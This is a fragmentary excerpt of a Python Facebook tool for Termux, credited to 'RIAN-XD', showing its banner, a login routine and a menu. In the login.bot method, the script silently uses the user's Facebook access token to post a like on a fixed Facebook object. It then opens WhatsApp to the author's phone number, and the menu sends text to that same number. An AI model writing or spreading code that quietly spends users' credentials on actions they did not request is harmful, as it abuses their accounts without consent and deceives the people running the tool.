...
░█▀▄░█░█▀█░█▒▀█░▀▀░█▒█▒█▄▀
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : RIAN-XD
 [\x1b[1;96m+%s] Github   : -
 [\x1b[1;96m+%s] Facebook : NO NAME
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
		os.system('xdg-open wa.me/6285840724432')
		menu().main()
...
class menu:
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			url_wa = ("https://api.whatsapp.com/+6285840724432?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
